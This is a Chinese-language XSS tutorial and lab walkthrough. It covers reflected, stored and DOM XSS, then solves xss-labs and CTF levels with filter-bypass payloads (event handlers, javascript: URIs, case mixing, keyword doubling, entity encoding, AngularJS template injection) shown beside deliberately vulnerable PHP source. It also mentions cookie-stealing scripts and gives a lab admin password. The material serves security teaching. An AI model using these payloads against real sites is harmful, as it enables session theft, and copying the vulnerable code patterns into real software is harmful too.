---
comments: true

---
# XSS跨站脚本(Cross-Site Scripting)

## 类型介绍

### 反射型(Reflected XSS)

反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中

反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

 

### 存储型(Stored XSS)

持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。

此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

 

### DOM型(DOM-based XSS)

传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。

 

## 常见攻击向量

1.alert()

alert('xss')

alert("xss")

alert(/xss/)

alert(document.cookie)

2.confirm()

confirm('xss')

confirm("xss")

confirm(/xss/)

confirm(document.cookie)

3.prompt()

prompt('xss')

prompt("xss")

prompt(/xss/)

prompt(document.coolkie)

(/xss/)以上三种方法都可以实现，但是会多出两个‘/’

## 实战

<!-- Imported from D:\\Book\\Web\\Chapter9\9-1.md -->
### 存储型 XSS


![](https://pic1.imgdb.cn/item/67b18a2dd0e0a243d4ffc56a.jpg)

留言功能网页，先输入正常数据测试

![](https://pic1.imgdb.cn/item/67b18a3ed0e0a243d4ffc56b.jpg)

被插入到了网页中

![](https://pic1.imgdb.cn/item/67b18a4dd0e0a243d4ffc56c.jpg)

输入恶意 XSS 弹窗代码

![](https://pic1.imgdb.cn/item/67b18aacd0e0a243d4ffc56d.jpg)

没有触发，需要切换用户访问

官方推荐的是使用第三方 XSS 接收平台

这里直接访问管理员后台，密码是 011be4d65feac1a8（环境有问题扫不出一个 sql 文件了）

![](https://pic1.imgdb.cn/item/67b18ad0d0e0a243d4ffc56f.jpg)

登录后台有触发了弹窗

![](https://pic1.imgdb.cn/item/67b18ae3d0e0a243d4ffc571.jpg)

我们插入获取 cookie 值的恶意脚本

![](https://pic1.imgdb.cn/item/67b18af2d0e0a243d4ffc572.jpg)

再次登录拿到了 flag

![](https://pic1.imgdb.cn/item/67b18b00d0e0a243d4ffc573.jpg)


<!-- Imported from D:\\Book\\Web\\Chapter9\9-10.md -->
### Referer XSS


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第十一关**

看一下源码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];	// 接收 Referer 字段
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

过滤了 `<>`，不能直接插入 payload，但是没有过滤 `""` 考虑下事件绕过

```html
Referer: " onclick=javascript:alert() type="text
```

![](https://pic1.imgdb.cn/item/68146ee158cb8da5c8d68a5c.png)

点击弹窗

![](https://pic1.imgdb.cn/item/68146efe58cb8da5c8d68a5e.png)


<!-- Imported from D:\\Book\\Web\\Chapter9\9-11.md -->
### User-Agent XSS


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第十二关**

查看源代码发现这次插入的是 `User-Agent` 头

![](https://pic1.imgdb.cn/item/6814723558cb8da5c8d68a9a.png)

继续使用上一关的 payload

```
User-Agent: " onclick=javascript:alert() type="text
```

![](https://pic1.imgdb.cn/item/681472e058cb8da5c8d68aac.png)

成功弹窗

![](https://pic1.imgdb.cn/item/6814730758cb8da5c8d68ab2.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];		// 接收 User-Agent
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-12.md -->
### Cookie XSS


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第十三关**

查看源代码发现这次值是 `t_cook`，猜测为 `cookie`

![](https://pic1.imgdb.cn/item/6814741a58cb8da5c8d68b00.png)

更改 `cookie` 为上一关的 payload，然后刷新网页就能看到框了

```html
" onclick=javascript:alert() type="text
```

![](https://pic1.imgdb.cn/item/681474b258cb8da5c8d68b23.png)

成功弹窗

![](https://pic1.imgdb.cn/item/681474f158cb8da5c8d68b3c.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-13.md -->
### Angular JS ng-include XSS


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第十五关**

看到这一关的参数是文件名

![](https://pic1.imgdb.cn/item/6814763858cb8da5c8d68bc0.png)

查看源代码发现有 `ng-include` 指令引入了图片

![](https://pic1.imgdb.cn/item/68147b4d58cb8da5c8d6a511.png)

尝试换为第一关的文件没有显示

![](https://pic1.imgdb.cn/item/68147f6258cb8da5c8d6b672.png)

加上单引号后就有了

![](https://pic1.imgdb.cn/item/68147fa658cb8da5c8d6b680.png)

所以我们可以利用第一关的漏洞，引入后直接传参

```html
?src='/level1.php?name=<script>alert()</script>'
```

发现有做过滤

![](https://pic1.imgdb.cn/item/6814803758cb8da5c8d6b69b.png)

采用标签绕过

```
?src='level1.php?name=<img src=abc onerror=alert(1)>'
```

![](https://pic1.imgdb.cn/item/6814836b58cb8da5c8d6b761.png)

看一下源代码

```php+HTML
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-14.md -->
### 回车代替空格绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第十六关**

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>
```

空格被实体化了，采用回车代替，URL 编码是 `%0A`

`/` 被过滤了，采用短标签绕过

```html
?keyword=<svg%0Aonload=alert(1)>
```

![](https://pic1.imgdb.cn/item/681486ca58cb8da5c8d6bc81.png)



<!-- Imported from D:\\Book\\Web\\Chapter9\9-15.md -->
### 短标签绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第十六关**

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>
```

空格被实体化了，采用回车代替，URL 编码是 `%0A`

`/` 被过滤了，采用短标签绕过

```html
?keyword=<svg%0Aonload=alert(1)>
```

![](https://pic1.imgdb.cn/item/681486ca58cb8da5c8d6bc81.png)


<!-- Imported from D:\\Book\\Web\\Chapter9\9-16.md -->
### Angular JS 模板注入 XSS


![](https://pic1.imgdb.cn/item/68184d6958cb8da5c8dcab87.png)

**第六关**

测试发现存在模板注入漏洞

![](https://pic1.imgdb.cn/item/68184d8d58cb8da5c8dcab96.png)

构造 payload，[参考文章](https://juejin.cn/post/6891628594725847047#heading-4)

```
?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

`'a'.constructor.prototype.charAt=[].join`

- `'a'.constructor` 获取字符串的构造函数（String）
- `prototype.charAt` 访问 String 原型上的 charAt 方法
- 将 charAt 方法替换为数组的 join 方法

`$eval('x=1} } };alert(1)//')`

- `$eval` 是 AngularJS 的一个方法，用于执行字符串形式的表达式
- 注入的代码 `x=1} } };alert(1)//` 包含：
  - `x=1` - 一个简单的赋值，部分目的是为了闭合前面的语法
  - `} } }` - 多个闭合括号，用于逃逸 AngularJS 的模板解析
  - `;alert(1)` - 实际要执行的恶意代码
  - `//` - JavaScript 注释，用于注释掉后续可能存在的代码


<!-- Imported from D:\\Book\\Web\\Chapter9\9-17.md -->
### DOM 跳转 XSS


![](https://pic1.imgdb.cn/item/687c5c7358cb8da5c8c80176.png)

进入网站直接看源代码

```js
<script>
    	// location.search：获取 URL 中 ? 后面的部分
    	// .split("=")：将字符串按照等号 = 分割成数组
    	// 如果 location.search 为 "?jumpto=https://www.baidu.com"，target 会是：
    	// ["?jumpto", "https://www.baidu.com"]
        var target = location.search.split("=")

		// target[0] 是 "?jumpto"
		// .slice(1) 移除第一个字符 ?，变成 "jumpto"
		// 如果等于 "jumpto"，就进入 if 块
        if (target[0].slice(1) == "jumpto") {
            // 将浏览器重定向到 target[1]，也就是 https://www.baidu.com
            location.href = target[1];
        }
</script>
```

注意！当你将类似于  l`ocation.href = "javascript:alert('xss')"`  这样的代码赋值给  `location.href`  时

浏览器会将其解释为一种特殊的 URL 方案，即 `"javascript:"`

在这种情况下，浏览器会将后面的 JavaScript 代码作为 URL 的一部分进行解析，然后执行它

所以我们可以构造如下链接：执行 JS 语句

```
http://challenge-f42fd52528263d24.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)
```

![](https://pic1.imgdb.cn/item/687c722358cb8da5c8c82382.png)

用 `jQuery`  的  `$.getScript()`  函数来异步加载并执行平台的 JS 脚本，通过 `jumpto=javascript:$.getScript()`

![](https://pic1.imgdb.cn/item/687c7e9258cb8da5c8c83e5d.png)




<!-- Imported from D:\\Book\\Web\\Chapter9\9-18.md -->
### / 代替空格绕过


![](https://pic1.imgdb.cn/item/687c79dd58cb8da5c8c836a9.png)

利用 `/` 代替空格绕过

​	![](https://pic1.imgdb.cn/item/687c7a0c58cb8da5c8c836f7.png)

![](https://pic1.imgdb.cn/item/687c7a3158cb8da5c8c83781.png)


<!-- Imported from D:\\Book\\Web\\Chapter9\9-2.md -->
### URL XSS


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第一关**

可以发现 `name` 参数渲染到了网页上

![](https://pic1.imgdb.cn/item/68137e7958cb8da5c8d635e6.png)

尝试传入恶意代码

```html
?name=<script>alert()</script>
```

![](https://pic1.imgdb.cn/item/68137f1b58cb8da5c8d63641.png)

看一下源码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";	// 直接将 $str 拼接到了标签中导致存在漏洞
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-3.md -->
### 闭合绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第二关**

直接输入上一关 payload 没有执行

![](https://pic1.imgdb.cn/item/6813800158cb8da5c8d636a3.png)

查看页面源代码发现被插入到了 `value`

![](https://pic1.imgdb.cn/item/6813806258cb8da5c8d636af.png)

尝试闭合掉 `input` 标签及后面的 `">`

```html
"><script>alert()</script><"
```

成功弹窗

![](https://pic1.imgdb.cn/item/681380f758cb8da5c8d636ee.png)

看一下源码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
// htmlspecialchars()：转义 & " ' < >
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'"
<input type=submit name=submit value="搜索"/>
</form>
</center>';		// 这一段直接将 $str 拼接到了 value 中导致存在漏洞
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-4.md -->
### 事件绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第三关**

使用上一关的 payload 发现也被转义了

![](https://pic1.imgdb.cn/item/681382b758cb8da5c8d63762.png)

这里我们可以利用事件绕过，事件主要存在于一些标签的属性内部

还是要闭合下 `value`

```html
'onclick=javascript:alert()' 	<!-- 点击事件 --!>
```

提交后可以看到 `input` 标签中多了个 `onclick` 事件

![](https://pic1.imgdb.cn/item/681383eb58cb8da5c8d6379e.png)

这个时候我们在点击这个 `input` 即可弹窗

![](https://pic1.imgdb.cn/item/6813842958cb8da5c8d637b2.png)

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>	
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-5.md -->
### a href 绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第五关**

使用上一关 payload 发现 `on` 被替换为了 `o_n`

![](https://pic1.imgdb.cn/item/681385b858cb8da5c8d63814.png)

这下基本上大部分事件函数都不能用了

换一下思路尝试注入一个 `a` 标签试试，可以在其 `href` 属性中插入 JS 代码

```
"><a href=javascript:alert()>雾島风起時</a><"
```

点击标签后弹窗

![](https://pic1.imgdb.cn/item/6813872c58cb8da5c8d6386b.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);	// 做了替换
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-6.md -->
### 大小写绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第六关**

继续使用上一关的 payload 发现 `href` 被过滤了

![](https://pic1.imgdb.cn/item/6813881f58cb8da5c8d638a3.png)

尝试大小写混淆

```
"><a hRef=javascript:alert()>雾島风起時</a><"
```

点击后弹窗

![](https://pic1.imgdb.cn/item/681388a058cb8da5c8d638c7.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);	
$str4=str_replace("src","sr_c",$str3);	
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);	// 只匹配 href，区分大小写
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-7.md -->
### 双写绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第七关**

继续使用上一关的 payload 发现整个 `hRef` 被删除以及删除了 `script`

![](https://pic1.imgdb.cn/item/681389a158cb8da5c8d63901.png)

推测是不区分大小写，尝试双写关键字

```
"> <a hRhRefef=javascrscriptipt:alert()>雾島风起時</a> <"
```

点击后弹窗

![](https://pic1.imgdb.cn/item/68138a8a58cb8da5c8d63973.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-8.md -->
### Unicode 编码绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第八关**

这一关是直接将我们的值插入到 `href` 属性内，试过了前几种方法都不管用

![](https://pic1.imgdb.cn/item/68138b8b58cb8da5c8d639d6.png)

但是我们能利用 `href` 的隐藏属性自动 Unicode 解码

```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

点击后弹窗

![](https://pic1.imgdb.cn/item/68138bea58cb8da5c8d63a22.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);  // 全都转小写了，大小写混淆绕不了
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```




<!-- Imported from D:\\Book\\Web\\Chapter9\9-9.md -->
### 注释绕过


![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第九关**

试了下上一关的 payload，不行，压根都没插入

![](https://pic1.imgdb.cn/item/68138cb858cb8da5c8d63a8a.png)

输入正常链接后对比发现缺少了 `http://`

所以在原 payload 后面补上并注释掉即可

```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/*http://*/
```

点击弹窗

![](https://pic1.imgdb.cn/item/68138d1b58cb8da5c8d63ac9.png)

查看下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))		// 这里有个校验
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```


